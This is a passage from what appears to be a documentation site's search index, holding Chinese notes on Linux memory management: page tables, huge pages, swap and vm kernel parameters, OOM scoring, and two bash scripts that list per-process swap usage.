\u63d0\u4f9b\u4e86\u4e24\u79cd\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u591a\u7ea7\u9875\u8868\u548c\u5927\u9875\uff08HugePage\uff09\u3002\u591a\u7ea7\u9875\u8868\u5c31\u662f\u628a\u5185\u5b58\u5206\u6210\u533a\u5757\u6765\u7ba1\u7406\uff0c\u5c06\u539f\u6765\u7684\u6620\u5c04\u5173\u7cfb\u6539\u6210\u533a\u5757\u7d22\u5f15\u548c\u533a\u5757\u5185\u7684\u504f\u79fb\u3002\u7531\u4e8e\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u901a\u5e38\u53ea\u7528\u4e86\u5f88\u5c11\u4e00\u90e8\u5206\uff0c\u90a3\u4e48\uff0c\u591a\u7ea7\u9875\u8868\u5c31\u53ea\u4fdd\u5b58\u8fd9\u4e9b\u4f7f\u7528\u4e2d\u7684\u533a\u5757\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5927\u5927\u5730\u51cf\u5c11\u9875\u8868\u7684\u9879\u6570\u3002 Linux \u7528\u7684\u6b63\u662f\u56db\u7ea7\u9875\u8868\u6765\u7ba1\u7406\u5185\u5b58\u9875\uff08\u8fd9\u91cc\u4e0d\u592a\u51c6\u786e\uff0c\u4e0d\u540c\u7684\u53d1\u884c\u7248\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5728redhat8.0\u5c31\u7528\u4e865\u7ea7\uff0c Chapter 5. RHEL 8.0.0 release Red Hat Enterprise Linux 8 | Red Hat Customer Portal \uff09\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u865a\u62df\u5730\u5740\u88ab\u5206\u4e3a 5 \u4e2a\u90e8\u5206\uff0c\u524d 4 \u4e2a\u8868\u9879\u7528\u4e8e\u9009\u62e9\u9875\uff0c\u800c\u6700\u540e\u4e00\u4e2a\u7d22\u5f15\u8868\u793a\u9875\u5185\u504f\u79fb\u3002 \u518d\u770b\u5927\u9875\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u6bd4\u666e\u901a\u9875\u66f4\u5927\u7684\u5185\u5b58\u5757\uff0c\u5e38\u89c1\u7684\u5927\u5c0f\u6709 2MB \u548c 1GB\u3002\u5927\u9875\u901a\u5e38\u7528\u5728\u4f7f\u7528\u5927\u91cf\u5185\u5b58\u7684\u8fdb\u7a0b\u4e0a\uff0c\u6bd4\u5982 Oracle\u3001DPDK \u7b49\u3002\u901a\u8fc7\u8fd9\u4e9b\u673a\u5236\uff0c\u5728\u9875\u8868\u7684\u6620\u5c04\u4e0b\uff0c\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u901a\u8fc7\u865a\u62df\u5730\u5740\u6765\u8bbf\u95ee\u7269\u7406\u5185\u5b58\u4e86","title":"\u5185\u5b58"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E7%9A%84%E6%89%8B%E6%AE%B5/","text":"\u670d\u52a1\u5668\u7269\u7406\u5185\u5b58\u8db3\u591f\u5927\u65f6\uff0c\u76f4\u63a5\u7981\u7528swap\uff0c\u5982\u679c\u5b9e\u5728\u9700\u8981\u7528\u5230swap\uff0c\u53ef\u4ee5\u964d\u4f4eswappines\u7684\u503c\uff0c\u964d\u4f4e\u5185\u5b58\u56de\u6536\u65f6swap\u7684\u4f7f\u7528\u503e\u5411 \u8c03\u4f4e\u6838\u5fc3\u5e94\u7528\u7684/proc/pid/oom_score_adj\u53c2\u6570\u503c\uff0c\u5373\u4f7f\u5185\u5b58\u7d27\u5f20\uff0c\u6838\u5fc3\u5e94\u7528\u4e5f\u4e0d\u4f1a\u88abOOM \u6740\u6b7b \u4f7f\u7528\u5927\u91cf\u5185\u5b58\u7684\u670d\u52a1\u5efa\u8bae\u914d\u7f6e\u5927\u9875\u5185\u5b58\uff0c\u51cf\u5c11\u5185\u5b58\u6620\u5c04\u9875\u8868\u7684\u6761\u76ee\u6570\uff0c\u964d\u4f4e\u5185\u5b58\u6d88\u8017\uff0c\u5178\u578b\u7684\u670d\u52a1\u5982oracle \u4f7f\u7528cgroups \u9650\u5236\u8fdb\u7a0b\u7684\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u907f\u514d\u7cfb\u7edf\u5185\u5b58\u88ab\u6709\u7f3a\u9677\u7684\u5f02\u5e38\u8fdb\u7a0b\u8017\u5c3d \u76f8\u5173\u5185\u6838\u53c2\u6570 \u9009\u9879 \u9ed8\u8ba4\u503c \u63cf\u8ff0 /proc/sys/vm/dirty_background_bytes 0 \u89e6\u53d1pdflush\u540e\u53f0\u56de\u5199\u7684\u810f\u5185\u5b58\u5927\u5c0f /proc/sys/vm/dirty_background_ratio 10 \u89e6\u53d1pdflush\u540e\u53f0\u56de\u5199\u7684\u810f\u5185\u5b58\u767e\u5206\u6bd4 /proc/sys/vm/dirty_bytes 0 \u89e6\u53d1\u4e00\u4e2a\u5199\u5165\u8fdb\u7a0b\u540e\u53f0\u56de\u5199\u7684\u810f\u5185\u5b58\u5927\u5c0f /proc/sys/vm/dirty_ratio 10 \u89e6\u53d1\u4e00\u4e2a\u5199\u5165\u8fdb\u7a0b\u540e\u53f0\u56de\u5199\u7684\u810f\u5185\u5b58\u6bd4\u4f8b /proc/sys/vm/dirty_expire_centisecs 3000 pdflush\u540e\u53f0\u5199\u5165\u810f\u5185\u5b58\u7684\u6700\u5c0f\u65f6\u95f4 /proc/sys/vm/dirty_writeback_centisecs 500 pdflush\u6d3b\u8dc3\u65f6\u95f4\u95f4\u9694\uff080\u4e3a\u505c\u7528\uff09 /proc/sys/vm/min_free_kbytes \u5185\u6838\u52a8\u6001\u8ba1\u7b97\u5185\u5b58\u56de\u6536\u7a7a\u95f2\u5185\u5b58\u6700\u5c0f\u503c /proc/sys/vm/overcommit_memory 0 0\u5141\u8bb8\u5229\u7528\u7b97\u6cd5\u5408\u7406\u7684\u8fc7\u5ea6\u5206\u914d\uff0c1\u503c\u5141\u8bb8\u8fc7\u5ea6\u5206\u914d\uff0c2\u7981\u6b62\u8fc7\u5ea6\u5206\u914d /proc/sys/vm/overcommit_ratio \u8fc7\u5ea6\u5206\u914d\u7684\u6bd4\u4f8b /proc/sys/vm/swappiness 30 \u56de\u6536\u533f\u540d\u9875\u7684\u503e\u5411\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4f7f\u7528swap\u7684\u503e\u5411 /proc/sys/vm/vfs_cache_pressure 100 \u56de\u6536\u6587\u4ef6\u7cfb\u7edf\u76ee\u5f55\u9879\u7f13\u5b58\u548c\u7d22\u5f15\u8282\u70b9\u7f13\u5b58\u7684\u503e\u5411\uff0c0\u4e3a\u4e0d\u56de\u6536\u3002\u51cf\u5c11vfs_cache_pressure\u4f1a\u5bfc\u81f4\u5185\u6838\u503e\u5411\u4e8e\u4fdd\u7559dentry\u548cinode\u7f13\u5b58\u3002\u800c\u589e\u52a0vfs_cache_pressure\u8d85\u8fc7100\u65f6\uff0c\u5219\u4f1a\u5bfc\u81f4\u5185\u6838\u503e\u5411\u4e8e\u91cd\u65b0\u58f0\u660edentries\u548cinodes\uff0c\u7b80\u800c\u8a00\u4e4b\uff0c\u5c0f\u4e8e100\u7684\u503c\u4e0d\u4f1a\u5bfc\u81f4\u7f13\u5b58\u7684\u5927\u91cf\u51cf\u5c11\u3002\u8d85\u8fc7100\u7684\u503c\u5219\u4f1a\u544a\u8bc9\u5185\u6838\u4f60\u5e0c\u671b\u4ee5\u9ad8\u4f18\u5148\u7ea7\u6765\u6e05\u7406\u7f13\u5b58\u3002\u5176\u5b9e\uff0c\u65e0\u8bba\u4f60\u91c7\u7528\u4ec0\u4e48\u503c\uff0c\u5185\u6838\u6e05\u7406\u7f13\u5b58\u7684\u901f\u5ea6\u90fd\u662f\u6bd4\u8f83\u4f4e\u7684\u3002\u5982\u679c\u5c06\u6b64\u503c\u8bbe\u7f6e\u4e3a10000\uff0c\u7cfb\u7edf\u5c06\u4f1a\u5c06\u7f13\u5b58\u51cf\u5c11\u5230\u4e00\u4e2a\u5408\u7406\u7684\u6c34\u5e73\u3002 /proc/sys/vm/drop_caches 0 1\u91ca\u653e\u9875\u7f13\u5b58cache\uff0c2\u91ca\u653e\u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7f13\u5b58\uff0c3\u91ca\u653e\u9875\u7f13\u5b58\u53ca\u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7f13\u5b58","title":"\u5185\u5b58\u4f18\u5316\u7684\u624b\u6bb5"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E7%9A%84%E6%96%B9%E5%BC%8F/","text":"\u5185\u5b58\u56de\u6536 \u6587\u4ef6\u9875 : \u53ef\u76f4\u63a5\u56de\u6536\u7684\u5185\u5b58\uff0c\u6bd4\u5982buffer\u548ccache \u533f\u540d\u9875 : \u5e94\u7528\u7a0b\u5e8f\u52a8\u6001\u5206\u914d\u7684\u5806\u5185\u5b58 OOM_SCORE : \u8fdb\u7a0b\u6d88\u8017\u7684\u5185\u5b58\u8d8a\u591a\uff0coom_score\u5c31\u8d8a\u5927\uff0coom_score\u5185\u6838\u901a\u8fc7\u5185\u5b58\u6d88\u8017\u8ba1\u7b97\u5f97\u51fa \uff0c\u53ef\u901a\u8fc7/proc\u6587\u4ef6\u7cfb\u7edf\u8bbe\u7f6e\u8fdb\u7a0b\u7684oom_adj\u6216oom_score_adj\u6765\u63a7\u5236oom_score, oom_adj \u7684\u8303\u56f4\u662f[-17, 15]\uff0c\u6570\u503c\u8d8a\u5927\uff0c\u8868\u793a\u8fdb\u7a0b\u8d8a\u5bb9\u6613\u88aboom\u6740\u6b7b\uff0c\u5176\u4e2d-17\u8868\u793a\u7981\u6b62oom, oom_score_adj\u7684\u8303\u56f4\u662f[-1000\uff0c1000]\uff0c\u539f\u7406\u8ddfoom_adj\u4e00\u6837\uff0c\u5206\u503c\u8d8a\u9ad8\u8d8a\u5bb9\u6613\u88aboom\u6740\u6b7b,\u5185\u6838\u7248\u672c2.6.36\u540e\u589e\u52a0oom_score_adj\u66ff\u4ee3oom_adj\uff0c\u4e3a\u4e86\u517c\u5bb9\uff0c\u76ee\u524d\u65b0\u7248\u672c\u5185\u6838\u4ecd\u7136\u4fdd\u7559oom_adj\uff0c\u5f53\u64cd\u4f5coom_adj\u65f6\uff0c\u5185\u6838\u5b9e\u9645\u4e0a\u662f\u4f1a\u6362\u7b97\u6210oom_score_adj \u5f53\u5185\u5b58\u7d27\u5f20\u7684\u65f6\u5019\uff0c\u5185\u6838\u901a\u8fc7 oom = oom_score + oom_score_adj \u8ba1\u7b97\u51fa\u5206\u6570\u6700\u9ad8\u7684\u8fdb\u7a0b\uff0c\u5411\u5176\u53d1\u9001\u5173\u95ed\u4fe1\u53f7\u3002 \u540e\u53f0\u56de\u6536 :\u5185\u6838\u7ebf\u7a0bkswapd0 \u5b9a\u671f\u626b\u63cf\u5185\u5b58\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u5e76\u6839\u636e\u5269\u4f59\u5185\u5b58\u843d\u5728\u8fd9\u4e09\u4e2a\u9608\u503c\u7684\u7a7a\u95f4\u4f4d\u7f6e\uff0c\u8fdb\u884c\u5185\u5b58\u7684\u56de\u6536\u64cd\u4f5c\uff0c\u5176\u4e2dpages_low=1.25\u500dpages_min\uff0cpage_high=1.5\u500dpages_min\uff0c\u5f53pages_free < pages_low\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1\u5185\u5b58\u7684\u56de\u6536\uff0c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/min_free_kbytes\u8bbe\u7f6epages_min\u6765\u63a7\u5236kswapd0\u7684\u56de\u6536\u65f6\u673a Swappiness \uff1a /proc/sys/vm/swappiness\u53c2\u6570\u63a7\u5236\u4f7f\u7528swap\u673a\u5236\u56de\u6536\u533f\u540d\u9875\u7684\u79ef\u6781\u7a0b\u5ea6\uff0cswappiness \u7684\u8303\u56f4\u662f0-100\uff0c\u9ed8\u8ba4\u503c60\uff0c\u4e0d\u8fc7\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u53ea\u662f\u8c03\u6574swap\u79ef\u6781\u7a0b\u5ea6\u7684\u6743\u91cd\uff0c\u5373\u4f7f\u4f60\u628a\u5b83\u8bbe\u7f6e\u62100\uff0c\u5f53\u5269\u4f59\u5185\u5b58\u52a0\u6587\u4ef6\u9875\u5c0f\u4e8epage_high \u65f6\uff0c \u8fd8\u662f\u4f1a\u53d1\u751fswap \uff0c \u53ef\u53c2\u8003 https://www.kernel.org/doc/Documentation/filesystems/proc.txt \u810f\u9875 \uff1a\u88ab\u5e94\u7528\u7a0b\u5e8f\u4fee\u6539\u8fc7\uff0c\u5e76\u4e14\u6682\u65f6\u8fd8\u6ca1\u5199\u5165\u78c1\u76d8\u7684\u6570\u636e\uff08\u4e5f\u5c31\u662f\u810f\u9875\uff09\uff0c\u8fd9\u4e9b\u810f\u9875\uff0c\u4e00\u822c\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u5199\u5165\u78c1\u76d8\u3002 \u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 fsync \uff0c\u628a\u810f\u9875\u540c\u6b65\u5230\u78c1\u76d8\u4e2d\uff1b \u4e5f\u53ef\u4ee5\u4ea4\u7ed9\u7cfb\u7edf\uff0c\u7531\u5185\u6838\u7ebf\u7a0b pdflush \u8d1f\u8d23\u8fd9\u4e9b\u810f\u9875\u7684\u5237\u65b0\u3002","title":"\u5185\u5b58\u56de\u6536\u7684\u65b9\u5f0f"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E7%9A%84%E6%96%B9%E5%BC%8F/#_1","text":"\u6587\u4ef6\u9875 : \u53ef\u76f4\u63a5\u56de\u6536\u7684\u5185\u5b58\uff0c\u6bd4\u5982buffer\u548ccache \u533f\u540d\u9875 : \u5e94\u7528\u7a0b\u5e8f\u52a8\u6001\u5206\u914d\u7684\u5806\u5185\u5b58 OOM_SCORE : \u8fdb\u7a0b\u6d88\u8017\u7684\u5185\u5b58\u8d8a\u591a\uff0coom_score\u5c31\u8d8a\u5927\uff0coom_score\u5185\u6838\u901a\u8fc7\u5185\u5b58\u6d88\u8017\u8ba1\u7b97\u5f97\u51fa \uff0c\u53ef\u901a\u8fc7/proc\u6587\u4ef6\u7cfb\u7edf\u8bbe\u7f6e\u8fdb\u7a0b\u7684oom_adj\u6216oom_score_adj\u6765\u63a7\u5236oom_score, oom_adj \u7684\u8303\u56f4\u662f[-17, 15]\uff0c\u6570\u503c\u8d8a\u5927\uff0c\u8868\u793a\u8fdb\u7a0b\u8d8a\u5bb9\u6613\u88aboom\u6740\u6b7b\uff0c\u5176\u4e2d-17\u8868\u793a\u7981\u6b62oom, oom_score_adj\u7684\u8303\u56f4\u662f[-1000\uff0c1000]\uff0c\u539f\u7406\u8ddfoom_adj\u4e00\u6837\uff0c\u5206\u503c\u8d8a\u9ad8\u8d8a\u5bb9\u6613\u88aboom\u6740\u6b7b,\u5185\u6838\u7248\u672c2.6.36\u540e\u589e\u52a0oom_score_adj\u66ff\u4ee3oom_adj\uff0c\u4e3a\u4e86\u517c\u5bb9\uff0c\u76ee\u524d\u65b0\u7248\u672c\u5185\u6838\u4ecd\u7136\u4fdd\u7559oom_adj\uff0c\u5f53\u64cd\u4f5coom_adj\u65f6\uff0c\u5185\u6838\u5b9e\u9645\u4e0a\u662f\u4f1a\u6362\u7b97\u6210oom_score_adj \u5f53\u5185\u5b58\u7d27\u5f20\u7684\u65f6\u5019\uff0c\u5185\u6838\u901a\u8fc7 oom = oom_score + oom_score_adj \u8ba1\u7b97\u51fa\u5206\u6570\u6700\u9ad8\u7684\u8fdb\u7a0b\uff0c\u5411\u5176\u53d1\u9001\u5173\u95ed\u4fe1\u53f7\u3002 \u540e\u53f0\u56de\u6536 :\u5185\u6838\u7ebf\u7a0bkswapd0 \u5b9a\u671f\u626b\u63cf\u5185\u5b58\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u5e76\u6839\u636e\u5269\u4f59\u5185\u5b58\u843d\u5728\u8fd9\u4e09\u4e2a\u9608\u503c\u7684\u7a7a\u95f4\u4f4d\u7f6e\uff0c\u8fdb\u884c\u5185\u5b58\u7684\u56de\u6536\u64cd\u4f5c\uff0c\u5176\u4e2dpages_low=1.25\u500dpages_min\uff0cpage_high=1.5\u500dpages_min\uff0c\u5f53pages_free < pages_low\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1\u5185\u5b58\u7684\u56de\u6536\uff0c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/min_free_kbytes\u8bbe\u7f6epages_min\u6765\u63a7\u5236kswapd0\u7684\u56de\u6536\u65f6\u673a Swappiness \uff1a /proc/sys/vm/swappiness\u53c2\u6570\u63a7\u5236\u4f7f\u7528swap\u673a\u5236\u56de\u6536\u533f\u540d\u9875\u7684\u79ef\u6781\u7a0b\u5ea6\uff0cswappiness \u7684\u8303\u56f4\u662f0-100\uff0c\u9ed8\u8ba4\u503c60\uff0c\u4e0d\u8fc7\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u53ea\u662f\u8c03\u6574swap\u79ef\u6781\u7a0b\u5ea6\u7684\u6743\u91cd\uff0c\u5373\u4f7f\u4f60\u628a\u5b83\u8bbe\u7f6e\u62100\uff0c\u5f53\u5269\u4f59\u5185\u5b58\u52a0\u6587\u4ef6\u9875\u5c0f\u4e8epage_high \u65f6\uff0c \u8fd8\u662f\u4f1a\u53d1\u751fswap \uff0c \u53ef\u53c2\u8003 https://www.kernel.org/doc/Documentation/filesystems/proc.txt \u810f\u9875 \uff1a\u88ab\u5e94\u7528\u7a0b\u5e8f\u4fee\u6539\u8fc7\uff0c\u5e76\u4e14\u6682\u65f6\u8fd8\u6ca1\u5199\u5165\u78c1\u76d8\u7684\u6570\u636e\uff08\u4e5f\u5c31\u662f\u810f\u9875\uff09\uff0c\u8fd9\u4e9b\u810f\u9875\uff0c\u4e00\u822c\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u5199\u5165\u78c1\u76d8\u3002 \u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 fsync \uff0c\u628a\u810f\u9875\u540c\u6b65\u5230\u78c1\u76d8\u4e2d\uff1b \u4e5f\u53ef\u4ee5\u4ea4\u7ed9\u7cfb\u7edf\uff0c\u7531\u5185\u6838\u7ebf\u7a0b pdflush \u8d1f\u8d23\u8fd9\u4e9b\u810f\u9875\u7684\u5237\u65b0\u3002","title":"\u5185\u5b58\u56de\u6536"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98%E9%A1%B5%E7%9A%84%E7%90%86%E8%A7%A3/","text":"\u5185\u5b58\u9875 Linux\u5185\u5b58\u2eda\u9ed8\u8ba4\u5927\u5c0f\u662f4K\u7684\uff0c\u6240\u4ee5\u6bcf\u4e2a4K\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684page\u7ed3\u6784\u4f53\u8fdb\u884c\u7ba1\u7406\u3002Linux\u6709\u5927\u2eda\u529f\u80fd\uff0c\u6bd4\u59822M\uff0c1G\u5927\u2eda\uff0c\u4f46\u8fd9\u91cc\u7684\u5927\u2eda\u5e76\u4e0d\u662f\u6307Linux\u7ba1\u7406\u7269\u7406\u5185\u5b58\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u800c\u662f\u6307MMU\u2eda\u8868\u9879\u6240\u80fd\u63cf\u8ff0\u7684\u6700\u5927\u7269\u7406\u5757\u7a7a\u95f4\uff0c\u4f7f\u7528\u66f4\u5927\u7684\u2eda\uff0c\u662f\u4e3a\u4e86\u51cf\u5c11TLB miss\u9020\u6210\u67e5\u2eda\u8868\u5e26\u6765\u7684\u6027\u80fd\u5f00\u9500\u3002\u4e00\u4e2a\u5927\u2eda\uff0c\u4e5f\u662f\u7531\u591a\u4e2a\u8fde \u7eed\u7684\u7269\u7406\u2eda\u7ec4\u6210\u7684\uff0c\u6bcf\u4e2a\u7269\u7406\u2eda\u4e5f\u90fd\u6709page\u7ed3\u6784\u4f53\u63cf\u8ff0\u3002\u6240\u4ee5\uff0c\u5728Linux\u91cc\u97624K\u7269\u7406\u2eda\uff0c\u4e0eHugetlbfs\u4e2d\u7684\u5927\u2eda\u662f\u6ca1\u6709\u76f8\u63a5\u5173\u7cfb\u7684\u3002\u56de\u5230\u6700\u521d\u7684\u95ee\u9898\uff0c\u7528\u4e00\u4e2apage\u7ed3\u6784\uff0c\u7ba1\u7406\u4e00\u4e2a4K\u5927\u5c0f\u7684\u7269\u7406\u2eda\uff0c\u8fd9\u4e2a\u5185\u5b58\u5f00\u9500\u4e5f\u4e0d\u5c0f\uff0c\u5bf9\u4e8e\u5927\u5185\u5b58\u673a\u5668\u6765\u8bf4\uff0c\u4e5f\u662f\u4e00\u4e2a\u4e0d\u5c0f\u7684\u5f00\u9500\u3002\u6240\u4ee5\uff0c\u5728X86_64\u67b6\u6784\u548cARM64\u67b6\u6784\u91cc\uff0cLinux\u5185\u6838\u652f\u6301\u5c06\u7269\u7406\u2eda\u914d\u7f6e\u621064K\u2eda\u5927\u5c0f\uff0c\u5373\u4e00\u4e2apage\u7ed3\u6784\u63cf\u4e00\u4e2a64K\u5c0f\u7684\u7269\u7406\u2eda\u3002 \u7efc\u5408\u8d77\u6765\uff0cLinux\u7684\u2eda\u662f\u8fd9\u6837\u7684\uff1a 1\uff09\u4ece\u7ba1\u7406\u7684\u2ec6\u5ea6\u6765\u8bf4\uff0c\u652f\u63014K\u2eda\u548c64K\u2eda 2\uff09\u4ece\u6620\u5c04\u5355\u4f4d\u6765\u8bf4\uff0c\u652f\u63014K/2M/1G\uff0c\u5177\u4f53\u770b\u4f53\u7cfb\u67b6\u6784 \u67e5\u770b\u9ed8\u8ba4\u9875\u5927\u5c0f\u547d\u4ee4\uff1a $ getconf PAGE_SIZE 4096","title":"\u5185\u5b58\u9875\u7684\u7406\u89e3"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E5%86%85%E5%AD%98%E9%A1%B5%E7%9A%84%E7%90%86%E8%A7%A3/#_1","text":"Linux\u5185\u5b58\u2eda\u9ed8\u8ba4\u5927\u5c0f\u662f4K\u7684\uff0c\u6240\u4ee5\u6bcf\u4e2a4K\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684page\u7ed3\u6784\u4f53\u8fdb\u884c\u7ba1\u7406\u3002Linux\u6709\u5927\u2eda\u529f\u80fd\uff0c\u6bd4\u59822M\uff0c1G\u5927\u2eda\uff0c\u4f46\u8fd9\u91cc\u7684\u5927\u2eda\u5e76\u4e0d\u662f\u6307Linux\u7ba1\u7406\u7269\u7406\u5185\u5b58\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u800c\u662f\u6307MMU\u2eda\u8868\u9879\u6240\u80fd\u63cf\u8ff0\u7684\u6700\u5927\u7269\u7406\u5757\u7a7a\u95f4\uff0c\u4f7f\u7528\u66f4\u5927\u7684\u2eda\uff0c\u662f\u4e3a\u4e86\u51cf\u5c11TLB miss\u9020\u6210\u67e5\u2eda\u8868\u5e26\u6765\u7684\u6027\u80fd\u5f00\u9500\u3002\u4e00\u4e2a\u5927\u2eda\uff0c\u4e5f\u662f\u7531\u591a\u4e2a\u8fde \u7eed\u7684\u7269\u7406\u2eda\u7ec4\u6210\u7684\uff0c\u6bcf\u4e2a\u7269\u7406\u2eda\u4e5f\u90fd\u6709page\u7ed3\u6784\u4f53\u63cf\u8ff0\u3002\u6240\u4ee5\uff0c\u5728Linux\u91cc\u97624K\u7269\u7406\u2eda\uff0c\u4e0eHugetlbfs\u4e2d\u7684\u5927\u2eda\u662f\u6ca1\u6709\u76f8\u63a5\u5173\u7cfb\u7684\u3002\u56de\u5230\u6700\u521d\u7684\u95ee\u9898\uff0c\u7528\u4e00\u4e2apage\u7ed3\u6784\uff0c\u7ba1\u7406\u4e00\u4e2a4K\u5927\u5c0f\u7684\u7269\u7406\u2eda\uff0c\u8fd9\u4e2a\u5185\u5b58\u5f00\u9500\u4e5f\u4e0d\u5c0f\uff0c\u5bf9\u4e8e\u5927\u5185\u5b58\u673a\u5668\u6765\u8bf4\uff0c\u4e5f\u662f\u4e00\u4e2a\u4e0d\u5c0f\u7684\u5f00\u9500\u3002\u6240\u4ee5\uff0c\u5728X86_64\u67b6\u6784\u548cARM64\u67b6\u6784\u91cc\uff0cLinux\u5185\u6838\u652f\u6301\u5c06\u7269\u7406\u2eda\u914d\u7f6e\u621064K\u2eda\u5927\u5c0f\uff0c\u5373\u4e00\u4e2apage\u7ed3\u6784\u63cf\u4e00\u4e2a64K\u5c0f\u7684\u7269\u7406\u2eda\u3002 \u7efc\u5408\u8d77\u6765\uff0cLinux\u7684\u2eda\u662f\u8fd9\u6837\u7684\uff1a 1\uff09\u4ece\u7ba1\u7406\u7684\u2ec6\u5ea6\u6765\u8bf4\uff0c\u652f\u63014K\u2eda\u548c64K\u2eda 2\uff09\u4ece\u6620\u5c04\u5355\u4f4d\u6765\u8bf4\uff0c\u652f\u63014K/2M/1G\uff0c\u5177\u4f53\u770b\u4f53\u7cfb\u67b6\u6784 \u67e5\u770b\u9ed8\u8ba4\u9875\u5927\u5c0f\u547d\u4ee4\uff1a $ getconf PAGE_SIZE 4096","title":"\u5185\u5b58\u9875"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8Bswap%E4%BD%BF%E7%94%A8%E7%9A%84%E8%84%9A%E6%9C%AC/","text":"\u67e5\u770b\u8fdb\u7a0b\u7684swap\u4f7f\u7528 \u7b2c\u4e00\u79cd\u811a\u672c #!/bin/bash ######################################## # \u811a\u672c\u529f\u80fd \uff1a \u5217\u51fa\u6b63\u5728\u5360\u7528swap\u7684\u8fdb\u7a0b\u3002 ######################################## echo -e \"PID\\t\\tSwap\\tProc_Name\" # \u62ff\u51fa/proc\u76ee\u5f55\u4e0b\u6240\u6709\u4ee5\u6570\u5b57\u4e3a\u540d\u7684\u76ee\u5f55\uff08\u8fdb\u7a0b\u540d\u662f\u6570\u5b57\u624d\u662f\u8fdb\u7a0b\uff0c\u5176\u4ed6\u5982sys,net\u7b49\u5b58\u653e\u7684\u662f\u5176\u4ed6\u4fe1\u606f\uff09 for pid in `ls -l /proc|awk '/^d/ {print $NF}'|grep ^[0-9]` do # Do not check init process if [ $pid -eq 1 ];then continue;fi # \u5224\u65ad\u6539\u8fdb\u7a0b\u662f\u5426\u5360\u7528\u4e86swap grep -q \"Swap\" /proc/$pid/smaps 2>/dev/null if [ $? -eq 0 ];then # \u5982\u679c\u5360\u7528\u4e86swap swap=$(grep Swap /proc/$pid/smaps| gawk '{ sum+=$2} END{ print sum }') # \u8fdb\u7a0b\u540d #proc_name=$(ps aux | grep -w \"$pid\" | grep -v grep proc_name=$(ps -eo pid,comm | grep -w \"$pid\" | grep -v grep|awk '{print $NF}') if [ $swap -ge 0 ];then # \u5982\u679c\u5360\u7528\u4e86swap\u5219\u8f93\u51fa\u5176\u4fe1\u606f echo -e \"$pid\\t${swap}\\t$proc_name\" fi fi done | sort -k2 -n | gawk -F'\\t' '{ pid[NR]=$1; size[NR]=$2; name[NR]=$3; } END{ for(id=1;id<=length(pid);id++) { if(size[id]<1024) printf(\"%-10s\\t%10sKB\\t%s\\n\",pid[id],size[id],name[id]); else if(size[id]<1048576) printf(\"%-10s\\t%10.2fMB\\t%s\\n\",pid[id],size[id]/1024,name[id]); else printf(\"%-10s\\t%10.2fGB\\t%s\\n\",pid[id],size[id]/1048576,name[id]); } }' \u7ed3\u679c\uff1a PID Swap Proc_Name 10519 0KB pickup 10579 0KB sshd 10581 0KB bash 1101 0KB dhclient 1168 0KB iscsid 1169 0KB tuned 1171 0KB rshim \u7b2c\u4e8c\u79cd\u811a\u672c for i in $(ls /proc 2>/dev/null | grep \"^[0-9]\" ); do awk '/Swap:/{a=a+$2}END{print '\"$i\"',a/1024\"M\"}' /proc/$i/smaps;done 2>/dev/null | sort -k2nr \u7ed3\u679c\uff1a 10092 0M 10 0M 10519 0M 10579 0M 10581 0M 10666 0M 10754 0M 10801 0M 1 0M","title":"\u67e5\u770b\u8fdb\u7a0bswap\u4f7f\u7528\u7684\u811a\u672c"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8Bswap%E4%BD%BF%E7%94%A8%E7%9A%84%E8%84%9A%E6%9C%AC/#swap","text":"","title":"\u67e5\u770b\u8fdb\u7a0b\u7684swap\u4f7f\u7528"},{"location":"system/linux/%E5%86%85%E5%AD%98/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8Bswap%E4%BD%BF%E7%94%A8%E7%9A%84%E8%84%9A%E6%9C%AC/#_1","text":"#!/bin/bash ######################################## # \u811a\u672c\u529f\u80fd \uff1a \u5217\u51fa\u6b63\u5728\u5360\u7528swap\u7684\u8fdb\u7a0b\u3002 ######################################## echo -e \"PID\\t\\tSwap\\tProc_Name\" # 